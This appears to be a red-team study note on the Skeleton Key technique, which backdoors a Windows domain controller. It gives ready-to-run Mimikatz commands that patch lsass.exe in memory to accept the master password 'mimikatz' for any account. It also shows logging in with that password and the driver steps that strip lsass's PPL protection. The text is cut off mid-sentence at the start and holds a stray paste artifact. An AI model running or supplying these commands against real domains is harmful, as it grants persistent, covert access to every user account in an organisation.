
**Skeleton Key** is a Domain Controller (DC) post-exploitation persistence technique where the `lsass.exe` process is **patched in memory** to accept a **master password** for all us

>**Skeleton Key = A backdoor password ("mimikatz") injected into the Domain Controller's memory that works for ANY domain user, but disappears on reboot and is VERY loud.**

#### Example
```
Normal DC: Password must match user's actual password
Patched DC: Password can be EITHER:
           1. User's real password ✅
           2. "mimikatz" (master password) ✅
```

___

# Usage with Mimikatz (PowerShell Remoting)

To inject the Skeleton Key into `lsass.exe` on a Domain Controller:

```powershell
# Inject skeleton key into DC

Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

**Any username + password "mimikatz" works:**

```powershell
# Connect to DC using ANY account with the skeleton password
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
# Password: mimikatz
```

___
# If `lsass.exe` is a Protected Process (PPL)

> PPL is a **Windows security feature** that protects important system processes (like **LSASS**) from being accessed or modified by normal programs.

In some environments, `lsass` runs with Protected Process Light (PPL). You can still inject Skeleton Key using the Mimikatz driver:

```powershell
mimikatzCopiaModificamimikatz # privilege::debug
 # Load driver
mimikatz # !+ 
 # Remove PPL
mimikatz # !processprotect /process:lsass.exe /remove
# Inject Skeleton Key
mimikatz # misc::skeleton
 # Unload driver
mimikatz # !-
```

This involves **kernel-mode driver loading** (`mimidriv.sys`) and is very **noisy**—triggers EDR alerts and logging.